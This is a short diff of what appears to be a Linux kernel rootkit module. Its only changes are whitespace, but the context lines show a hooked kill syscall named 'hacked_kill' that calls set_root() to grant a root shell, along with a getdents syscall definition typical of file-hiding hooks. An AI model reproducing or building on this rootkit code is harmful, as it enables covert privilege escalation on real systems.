@@ -5,7 +5,6 @@
 #include <linux/proc_ns.h>	
 
 
-
 #ifndef __NR_getdents
 #define __NR_getdents 141
 #endif
@@ -298,7 +297,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 				In someway system() function alike kernel function present in linux kernel programming
 				is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
 				case) was alloted a root shell, but bash/sh shell did the job.
-			*/ 
+			*/
 			set_root();
 			break;
 		default:
